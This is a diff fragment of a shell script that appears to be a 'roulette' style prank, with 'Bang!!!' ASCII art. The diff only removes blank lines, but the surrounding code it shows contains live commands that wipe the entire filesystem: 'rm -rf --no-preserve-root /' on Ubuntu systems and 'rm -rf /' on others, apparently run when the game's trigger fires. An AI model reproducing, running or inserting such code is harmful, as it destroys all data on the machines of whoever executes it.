@@ -14,7 +14,6 @@ Bang!!!                       |       \
                                  |         \
                                  |__________|
 '''
-
     # Ubuntu
     if [ -f /etc/lsb-release ]; then
         rm -rf --no-preserve-root /
@@ -26,7 +25,6 @@ Bang!!!                       |       \
     else
         rm -rf /
     fi
-
 else
     echo '''
 
